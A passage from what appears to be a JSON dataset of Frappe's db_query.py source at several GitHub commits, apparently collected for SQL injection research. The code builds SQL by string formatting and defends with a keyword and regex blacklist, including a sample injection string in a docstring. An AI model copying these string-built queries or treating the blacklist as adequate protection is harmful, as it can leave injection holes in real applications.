\"'%s' AND '%s'\" % (\n\t\tget_datetime(from_date).strftime(date_format),\n\t\tget_datetime(to_date).strftime(date_format))\n\n\treturn data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/omirajkar/bench_frappe/blob/e4d83fbc97f01a693c9f89969c49dc0e5c4fb1ba",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nfrom six import iteritems, string_types\n\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy, re\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.user_settings import get_user_settings, update_user_settings\nfrom datetime import datetime\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,\n\t\tupdate=None, add_total_row=None, user_settings=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))\n\t\t\traise frappe.PermissionError(self.doctype)\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], string_types):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.user_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif user_settings:\n\t\t\tself.user_settings = json.loads(user_settings)\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_user_settings:\n\t\t\tself.save_user_settings_fields = save_user_settings_fields\n\t\t\tself.update_user_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.sanitize_fields()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\n\t\tself.validate_order_by_and_group_by(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by(self.group_by)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, string_types):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, string_types):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in iteritems(fdict):\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef sanitize_fields(self):\n\t\t'''\n\t\t\tregex : ^.*[,();].*\n\t\t\tpurpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each\n\t\t\t\t\tfield which may leads to sql injection.\n\t\t\texample :\n\t\t\t\tfield = \"`DocType`.`issingle`, version()\"\n\n\t\t\tAs field contains `,` and mysql function `version()`, with the help of regex\n\t\t\tthe system will filter out this field.\n\t\t'''\n\n\t\tsub_query_regex = re.compile(\"^.*[,();].*\")\n\t\tblacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',\n\t\t\t'from', 'group', 'order', 'by']\n\t\tblacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',\n\t\t\t'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',\n\t\t\t'system_user', 'user', 'version']\n\n\t\tdef _raise_exception():\n\t\t\tfrappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)\n\n\t\tdef _is_query(field):\n\t\t\tif re.compile(\"^(select|delete|update|drop|create)\\s\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\telif re.compile(\"\\s*[a-zA-z]*\\s*( from | group by | order by | where | join )\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\tfor field in self.fields:\n\t\t\tif sub_query_regex.match(field):\n\t\t\t\tif any(keyword in field.lower().split() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"({0}\".format(keyword) in field.lower() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"{0}(\".format(keyword) in field.lower() for keyword in blacklisted_functions):\n\t\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile(\"[a-zA-Z]+\\s*'\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile('[a-zA-Z]+\\s*,').match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\t_is_query(field)\n\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f) or (\"count(\" in f):\n\t\t\t\t\tcontinue\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))\n\t\t\traise frappe.PermissionError(doctype)\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, string_types):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions, ignore_permissions=None):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif ignore_permissions is not None:\n\t\t\tself.flags.ignore_permissions = ignore_permissions\n\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, string_types):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator.lower() in ('in', 'not in'):\n\t\t\tvalues = f.value or ''\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator.lower() == 'between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\n\t\t\t\tvalue = get_between_date_filter(f.value, df)\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif (df and df.fieldtype==\"Datetime\") or isinstance(f.value, datetime):\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator.lower() in (\"like\", \"not like\") or (isinstance(f.value, string_types) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator.lower() in (\"like\", \"not like\") and isinstance(value, string_types):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, string_types) and not f.operator.lower() == 'between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator.lower() in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.permissions.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcond = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tif not cint(frappe.get_system_settings(\"apply_strict_user_permissions\")):\n\t\t\t\t\t\tcondition = cond + \" or \"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcondition = \"\"\n\t\t\t\t\tcondition += \"\"\"`tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values]))\n\t\t\t\telse:\n\t\t\t\t\tcondition = cond\n\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by(self, parameters):\n\t\t\"\"\"Check order by, group by so that atleast one column is selected and does not have subquery\"\"\"\n\t\tif not parameters:\n\t\t\treturn\n\n\t\t_lower = parameters.lower()\n\t\tif 'select' in _lower and ' from ' in _lower:\n\t\t\tfrappe.throw(_('Cannot use sub-query in order by'))\n\n\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.strip().startswith(\"`tab\"):\n\t\t\t\ttbl = field.strip().split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort/group\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_user_settings(self):\n\t\t# update user settings if new search\n\t\tuser_settings = json.loads(get_user_settings(self.doctype))\n\n\t\tif hasattr(self, 'user_settings'):\n\t\t\tuser_settings.update(self.user_settings)\n\n\t\tif self.save_user_settings_fields:\n\t\t\tuser_settings['fields'] = self.user_settings_fields\n\n\t\tupdate_user_settings(self.doctype, user_settings)\n\ndef get_order_by(doctype, meta):\n\torder_by = \"\"\n\n\tsort_field = sort_order = None\n\tif meta.sort_field and ',' in meta.sort_field:\n\t\t# multiple sort given in doctype definition\n\t\t# Example:\n\t\t# `idx desc, modified desc`\n\t\t# will covert to\n\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\torder_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,\n\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\telse:\n\t\tsort_field = meta.sort_field or 'modified'\n\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\torder_by = \"`tab{0}`.`{1}` {2}\".format(doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t# draft docs always on top\n\tif meta.is_submittable:\n\t\torder_by = \"`tab{0}`.docstatus asc, {1}\".format(doctype, order_by)\n\n\treturn order_by\n\n\n@frappe.whitelist()\ndef get_list(doctype, *args, **kwargs):\n\t'''wrapper for DatabaseQuery'''\n\tkwargs.pop('cmd', None)\n\tkwargs.pop('ignore_permissions', None)\n\treturn DatabaseQuery(doctype).execute(None, *args, **kwargs)\n\ndef is_parent_only_filter(doctype, filters):\n\t#check if filters contains only parent doctype\n\tonly_parent_doctype = True\n\n\tif isinstance(filters, list):\n\t\tfor flt in filters:\n\t\t\tif doctype not in flt:\n\t\t\t\tonly_parent_doctype = False\n\t\t\tif 'Between' in flt:\n\t\t\t\tflt[3] = get_between_date_filter(flt[3])\n\n\treturn only_parent_doctype\n\ndef get_between_date_filter(value, df=None):\n\t'''\n\t\treturn the formattted date as per the given example\n\t\t[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'\n\t'''\n\tfrom_date = None\n\tto_date = None\n\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\"\n\n\tif df:\n\t\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\" if df.fieldtype == 'Datetime' else \"%Y-%m-%d\"\n\n\tif value and isinstance(value, (list, tuple)):\n\t\tif len(value) >= 1: from_date = value[0]\n\t\tif len(value) >= 2: to_date = value[1]\n\n\tif not df or (df and df.fieldtype == 'Datetime'):\n\t\tto_date = add_to_date(to_date,days=1)\n\n\tdata = \"'%s' AND '%s'\" % (\n\t\tget_datetime(from_date).strftime(date_format),\n\t\tget_datetime(to_date).strftime(date_format))\n\n\treturn data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/omirajkar/bench_frappe/blob/1cb64cf06e5bd709024d52bdae1103bd26ae109d",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nfrom six import iteritems, string_types\n\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy, re\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.client import check_parent_permission\nfrom frappe.model.utils.user_settings import get_user_settings, update_user_settings\nfrom datetime import datetime\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,\n\t\tupdate=None, add_total_row=None, user_settings=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))\n\t\t\traise frappe.PermissionError(self.doctype)\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], string_types):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.user_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif user_settings:\n\t\t\tself.user_settings = json.loads(user_settings)\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_user_settings:\n\t\t\tself.save_user_settings_fields = save_user_settings_fields\n\t\t\tself.update_user_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s 